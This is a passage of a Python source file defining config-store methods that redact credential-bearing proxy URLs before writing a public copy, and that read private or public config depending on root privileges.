   130	    def redact_config_data(
   131	        self, user_config: UserConfigData
   132	    ) -> UserConfigData:
   133	        redacted_data_dict = user_config.to_dict()
   134	        for field in PROXY_FIELDS:
   135	            value = redacted_data_dict.get(field)
   136	            if value:
   137	                parsed_url = urlparse(value)
   138	                if parsed_url.username or parsed_url.password:
   139	                    redacted_data_dict[field] = "<REDACTED>"
   140	        return UserConfigData.from_dict(redacted_data_dict)
   141	
   142	    def read(self) -> UserConfigData:
   143	        if util.we_are_currently_root():
   144	            private_config = self._private.read()
   145	            if private_config is not None:
   146	                return private_config
   147	        public_config = self._public.read()
   148	        if public_config is not None:
   149	            return public_config
   150	        return UserConfigData()
   151	
   152	    def write(self, content: UserConfigData):
   153	        self._private.write(content)
   154	        redacted_content = self.redact_config_data(content)
   155	        self._public.write(redacted_content)
   156	
